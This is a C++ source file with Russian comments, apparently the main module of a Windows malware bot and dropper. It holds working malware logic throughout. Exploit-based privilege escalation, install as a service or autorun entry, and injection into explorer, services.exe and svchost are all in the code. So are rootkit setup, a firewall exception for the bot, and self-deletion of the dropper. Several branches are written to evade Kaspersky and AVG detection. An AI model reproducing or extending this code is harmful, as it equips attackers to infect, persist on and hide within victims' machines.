#include "main.h"
#include "core\file.h"
#include "core\elevation.h"
#include "service.h"
#include "core\pipe.h"
#include "AdminPanel.h"
#include "core\hook.h"
#include "core\pe.h"
#include "core\crypt.h"
#include "core\util.h"
#include "Manager.h"
#include "task.h"
#include "other.h"
#include "sandbox.h"
#include "tools.h"
#include "AV.h"

//#pragma comment(linker, "/MERGE:.rdata=.data")

//файл который нужно будет удалить после инжекта в проводник
char fileDropper[MAX_PATH];
//копирует дроппер в папку автозагрузки юзера
bool SetAutorun( StringBuilder& dropper );
//проверяет является ли дроппер автозагрузочным файлом
bool IsAutorun( StringBuilder& dropper );
//установка бота в автозагрузку
bool InstallBot( StringBuilder& path );
//возвращает true, если запущен касперский
bool IsPresentKAV();
//возвращает true если запущен дубликат бота, и в Config::state устанавливает флаг RUNNED_DUBLICATION
bool IsDuplication();

int main()
{
	if( !WinAPI::Init() ) return false;
	if( !Core::Init() ) return false;
	Rand::Init();
	if( !Config::Init() ) return false;

	StringBuilder path( fileDropper, sizeof(fileDropper) );
	Path::GetStartupExe(path);

	//Elevation::Sdrop(path);
/*
	Proxy::Info addr[10];
	int count = FindProxyAddr( addr, 10 );
	for( int i = 0; i < count; i++ )
		DbgMsg( "%d %s:%d", (int)addr[i].type, addr[i].ipPort.ip, addr[i].ipPort.port );
	return 0;
*/
	char paramSdrop[5]; //параметр по которому определяем что запустились с повышенными правами
	paramSdrop[0] = ' ';
	paramSdrop[1] = '-';
	paramSdrop[2] = 's';
	paramSdrop[3] = 'd';
	paramSdrop[4] = 0;

	char paramInject[5];
	paramInject[0] = ' ';
	paramInject[1] = '-';
	paramInject[2] = 'i';
	paramInject[3] = 'j';
	paramInject[4] = 0;

	char paramUpdate[4];
	paramUpdate[0] = ' ';
	paramUpdate[1] = '-';
	paramUpdate[2] = 'u';
	paramUpdate[3] = 0;
	int posParam = 0;

	Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), path, path.Len() );

	char* cmdLine = API(KERNEL32, GetCommandLineA)();
	int lenLine = Str::Len(cmdLine);
//	AVGUnload();
	if( Str::Cmp( cmdLine + lenLine - sizeof(paramSdrop) + 1, paramSdrop ) == 0 ) //запустили после получения системных прав
	{
		DbgMsg( "Дроппер запущен с системными правами" );
		//InstallBot(path);
#ifdef NOT_EXPLORER
		StartBot();
#else
		StartBotApart(true);
#endif
	}
	else if( (posParam = Str::IndexOf( cmdLine, paramInject, lenLine, sizeof(paramInject) - 1 )) > 0 ) //запуск для инжекта в проводник
	{
/*
		DbgMsg("Запустили с целью инжекта в проводник, имя менеджера: '%s'", cmdLine );
		posParam += sizeof(paramInject) - 1; //позиция за параметром, где указано нужно ли самоудаление
		if( cmdLine[posParam] == '1' )
			fileDropper[0] = 0; //отключаем самоудаление
		posParam += 2;
		Str::Copy( Config::nameManager, sizeof(Config::nameManager), cmdLine + posParam );
		InitRootkit(); //для текущего инжекта это необходимо
		RunInExplorer(ExplorerEntryFromService);
*/
	}
	else if( (posParam = Str::IndexOf( cmdLine, paramUpdate, lenLine, sizeof(paramUpdate) - 1 )) > 0 ) //горячее обновление
	{
		DbgMsg( "Запустили обновление" );
		posParam += sizeof(paramUpdate); //в этой позиции имя канала менеджера
		Delay(5000); //ждем пока старый закроется
		//fileDropper[0] = 0; //отключаем самоудаление
		Str::Copy( Config::nameManager, sizeof(Config::nameManager), cmdLine + posParam );
		Config::state |= EXTERN_NAME_MANAGER | RUNNED_UPDATE;
		StartBot();
	}
	else 
	{
		//антиэмуляционная защита от КАВа
		char path2[MAX_PATH];
		API(KERNEL32, GetTempPathA)( MAX_PATH, path2 );
		API(KERNEL32, CreateFileA)( path2, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
		if( API(KERNEL32, GetLastError)() == 3 )
		{
			IsDuplication();
			//смотрим является ли файл сервисом
			if( Service::IsService(path) )
			{
				Config::InitFileConfig(false);
				if( !Config::IsSleeping() )
					if( (Config::state & RUNNED_DUBLICATION) == 0 )
					{
						fileDropper[0] = 0; //отключаем самоудаление
						Config::state |= IS_SERVICE;
						if( !Service::Start() )
							StartBot();
					}
			}
			else if( IsAutorun(path) ) //запустился из автозагрузки
			{
				Config::InitFileConfig(true);
				if( !Config::IsSleeping() )
					if( (Config::state & RUNNED_DUBLICATION) == 0 )
					{
						fileDropper[0] = 0; //отключаем самоудаление
						StartBot();
					}
			}
			else //запущен дроппер
			{
				DbgMsg( "Запущен дроппер" );
				//Config::DelSleeping(); //если были в режиме сна, то удаляем эту пометку
				StringBuilderStack<MAX_PATH> exeSdrop = path;
				exeSdrop += paramSdrop;
				bool res = false;
#ifndef OFF_SDPROP
				if( IsPresentKAV() ) 
				{
					Config::state |= NOT_DIRECT_INJECT /*| NOT_USED_INJECT | NOT_INSTALL_SERVICE | NOT_INSTALL_AUTORUN*/; //для каспера отключаем прямой инжект
				}
				else
					if( (Config::state & SPLOYTY_OFF) == 0 )
						res = Elevation::Sdrop(exeSdrop);
#endif
				if( res ) //пытаемся запустить дроппера с системными правами
				{
					DbgMsg( "Sdrop ok" );
				}
				else
				{
					DbgMsg( "Sdrop bad" );
					//InstallBot(path);
					//StartBot();
				}
				StartBot();
			}
		}
	}

	API(KERNEL32, ExitProcess)(0);

	OutputDebugStringA(0); //чтобы в ехе была в таблица импорта kernel32.dll, которая ищется в WinAPI::Init()

	return 0;
}

#ifdef BOT_DLL

DWORD WINAPI DllThread( void* )
{
//	RunAdminPanelInSvchost();
	StartBot();
	Core::Release();
	return 0;
}

void main_dll( HMODULE hmodule )
{
	if( !WinAPI::Init() ) return;
	if( !Core::Init() ) return;
	if( !Config::Init() ) return;
	Rand::Init();
	Config::state |= IS_DLL;
	if( IsDuplication() ) return;

	fileDropper[0] = 0;
	API(KERNEL32, GetModuleFileNameA)( hmodule, Config::fileNameBot, sizeof(Config::fileNameBot) );
/*
	HMODULE imageBase = PE::GetImageBase(main_dll);
	DWORD sizeOfImage = PE::SizeOfImage(imageBase);

	void* newImageBase = API(KERNEL32, VirtualAlloc)( 0, sizeOfImage, MEM_RESERVE | MEM_COMMIT,	PAGE_EXECUTE_READWRITE );
	if( !newImageBase ) return;
	Mem::Copy( newImageBase, (void*)imageBase, sizeOfImage );

	PIMAGE_DOS_HEADER pdh = (PIMAGE_DOS_HEADER)imageBase;
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS) ((byte*)pdh + pdh->e_lfanew);

	ULONG relRVA   = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	ULONG relSize  = pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)((ADDR)imageBase + relRVA ), (ADDR)newImageBase, (ADDR)newImageBase - (ADDR)imageBase, relSize );
	ADDR addr = (ADDR)AdminPanelProcess - (ADDR)imageBase + (ADDR)newImageBase;
	//HANDLE hprocess = API(KERNEL32, GetCurrentProcess)();
	//API(KERNEL32, CreateRemoteThread)( hprocess, 0, 0, (LPTHREAD_START_ROUTINE)addr, 0, 0, 0 );
	//RunThread( (typeFuncThread)addr, 0 );
*/
	RunThread( DllThread, 0 );
}

//для старта в качестве длл
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			main_dll(hModule);
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}

#endif //BOT_DLL

bool InstallBot( StringBuilder& path, StringBuilder& dstFile )
{
	//пытаемся установиться как сервис
#ifndef OFF_SERVICE 
	if( (Config::state & NOT_INSTALL_SERVICE) == 0 )
		if( Service::Install( path, dstFile, false ) )
		{
			Config::InitFileConfig(false);
			Config::state |= IS_SERVICE;
			return true;
		}
#endif
#ifndef OFF_AUTORUN
	//пытаемся стать в автозагрузку
	if( (Config::state & NOT_INSTALL_AUTORUN) == 0 )
		if( SetAutorun(path) )
		{
			Config::InitFileConfig(true);
			return true;
		}
#endif
	Config::InitFileConfig(true);
	return false;
}

bool StartBot()
{
	WaitRunExplorer();
//	if( (Config::state & NOT_USED_INJECT) == 0 )
//		InitRootkit();
#ifdef NOT_EXPLORER
/*
	//для обхода касперского
	char path[MAX_PATH];
	GetTempPathA( MAX_PATH, path );
	HANDLE file = CreateFileA( path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0 );
	int err = GetLastError();
	if( err ==  3 )
		return RunAdminPanelInSvchost();
	else
		return false;
*/
	if( Config::state & NOT_USED_SCVHOST )
	{
		fileDropper[0] = 0; //отключаем самоудаление
		return RunAdminPanel(false);
	}
	else
	{
		if( Config::AV == AV_AVG )
		{
			DWORD pid = Process::GetPID( _CS_("services.exe") );//_CS_("winlogon.exe") );
			Config::state |= NOT_EXIT_PROCESS;
			InjectIntoProcess2( pid, AdminPanelProcess );
	//		RunInExplorer2((SIZE_T)AdminPanelProcess);
		}
		else
			return RunAdminPanelInSvchost();
	}
#else
	return RunInExplorer(ExplorerEntry);
#endif
}

bool RestartBot()
{
	DbgMsg("Перезапускаем бота");
	StringBuilder fileName;
	fileName = fileDropper;
	if( Service::IsService(fileName) ) //если утсановлен как сервис, то запускаем сервис
	{
		StringBuilder nameService;
		fileName.Lower();
		if( Service::GetNameService( nameService, fileName ) )
		{
			DbgMsg( "Запускаем сервис бота %s", nameService.c_str() );
			if( Service::Start(nameService) )
				return true;
		}
	}
	//добавляем в исключения брандмаузера файл бота и запускаем
	if( AddAllowedprogram(fileName) ) 
	{
		if( Process::Exec(fileName) )
			return true;
	}
	return false;
}

bool StartBotApart( bool dropper )
{
#ifndef NOT_EXPLORER
	//генерируемя имя для канала менеджера
	StringBuilder nameManager( Config::nameManager, sizeof(Config::nameManager) );
	PipePoint::GenName(nameManager);
	//ждем 30 секунд пока запустится проводник
	WaitRunExplorer();
	//запускаем бота в текущем юзере, чтобы оттуда внедриться в проводник
	StringBuilder cmd;
	Path::GetStartupExe(cmd);
	cmd += _CS_(" -ij" );
	cmd += dropper ? '2' : '1';
	cmd += ' ';
	cmd += nameManager;
	Process::ExecAsCurrUser(cmd);
	//RunInExplorer(ExplorerEntryFromService); //запускаем бота в проводнике
	//RunAdminPanel(true); //запускаем работу с админкой в отдельном потоке
	Delay(1000); //ждем пока запустится менеджер в проводнике
	InitRootkit();
	return RunAdminPanelInSvchost();
#else
	return false;
#endif
}


bool SetAutorun( StringBuilder& dropper )
{
	StringBuilderStack<MAX_PATH> autorun;
	Config::FullNameBotExe(autorun);
	Str::Copy( Config::fileNameBot, sizeof(Config::fileNameBot), autorun, autorun.Len() );
	DbgMsg( "Копируем в автозагрузку: %s", autorun.c_str() );
	File::SetAttributes( autorun, FILE_ATTRIBUTE_NORMAL ); //если файл существует, то снимаем аттрибуты защиты, чтобы скопировался без проблем
//	Mem::Data body;
//	File::ReadAll( dropper, body );
//	if( File::Write( autorun, body ) )
	if( File::Copy( dropper, autorun ) )
	{
		DbgMsg( "Установка в автозагрузку прошла успешно" );
		File::SetAttributes( autorun, FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
//		File::SetAttributes( autorun, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM );
		return true;
	}
	else
		DbgMsg( "В автозагрузку не удалось установиться" );
	return false;
}

bool IsAutorun( StringBuilder& dropper )
{
	StringBuilderStack<32> name;
	Config::NameBotExe(name);
	int res = dropper.IndexOf(name);
	if( res >= 0 )
		return true;
	return false;
}

DWORD WINAPI InstallBotThread( void* )
{
	StringBuilder path( 0, sizeof(fileDropper), fileDropper );
	if( (Config::state & RUNNED_DUBLICATION) == 0 )
	{
		DbgMsg( "Запущен поток инсталяции" );
		Delay(5000); //немного ждем, иначе проактивная защита может сработать, если делать сразу
		if( ManagerServer::GetGlobalState(Task::GlobalState_LeftAutorun) == '0' )
		{
			//копируем заранее в файл сервиса, который потом будет подхвачен при инсталяции
			//такое необходимо из-за того что KAV палит копирование exe в системные папки, а в этом месте не палит
			StringBuilder dstFile;
			if( (Config::state & NOT_INSTALL_SERVICE) == 0 )
				Service::Copy( path, dstFile ); 
//				Service::Copy(data); 
			InstallBot( path, dstFile );
		}
		else
		{
			Str::Copy( Config::fileNameBot, fileDropper ); //восстаналиваем месторасположение бота
			Task::ProtectBot();
			fileDropper[0] = 0;
			DbgMsg( "Был установлен сторонний авторан" );
		}
	}
	for( int i = 0; i < 10; i++ )
	{
		if( fileDropper[0] == 0 ) break;
//бот удаляет через его переименование, если напрямую удалять, то палит КАV
//также KAV не ругается если просто обнулять файл
		DbgMsg( "Удаляем дроппер %s, попытка %d", fileDropper, i + 1 );

		HANDLE hfile = File::Open( fileDropper, GENERIC_WRITE, CREATE_ALWAYS, FILE_FLAG_DELETE_ON_CLOSE );
		if( hfile )
		{
			File::Close(hfile);
			DbgMsg( "Дроппер успешно удален" );
			break;
		}

//		Process::Exec( "cmd.exe /c del \"%s\"", fileDropper );
//		StringBuilder path2;
//		File::WriteAll( path, 0, 0 );
//		path2 = path;
//		path2 += '1';
		//Path::GetPathName(path2);
		//path2 += "123";
//		API(KERNEL32, MoveFileExA)( path, path2, MOVEFILE_REPLACE_EXISTING );
//		if( File::WriteAll( path, path.c_str(), 0 ) )
//		if( File::Delete(fileDropper) )
//		if( File::Delete(path2) )
//		{
//			DbgMsg( "Дроппер успешно удален" );
//			break;
//		}
		Delay(1000);
	}
//	StringBuilder s(256);
//	s = "cmd.exe /C del ";
//	s += path;
//	Sandbox::Exec(s);
/* На будущее, еще способ удаления файла
char szPath[256] ;
GetModuleFileName(NULL, szPath, sizeof(szPath));
SHFILEOPSTRUCT sh;
sh.hwnd   = GetSafeHwnd();
sh.wFunc  = FO_DELETE;
sh.pFrom  =szPath;
sh.pTo    = NULL;
sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
sh.hNameMappings = 0;
sh.lpszProgressTitle = NULL;

SHFileOperation (&sh);
*/
	return 0;
}

bool IsPresentKAV()
{
	if( Config::AV == AV_KAV ) return true;
	return false;
}

bool IsDuplication()
{
	if( Config::state & CHECK_DUPLICATION )
	{
		if( Config::CreateMutex() )
			Config::ReleaseMutex(); //сразу освобождаем, захват произойдет позже
		else
		{
			Config::state |= RUNNED_DUBLICATION;
			DbgMsg( "Запущен дубликат" );
			return true;
		}
	}
	return false;
}
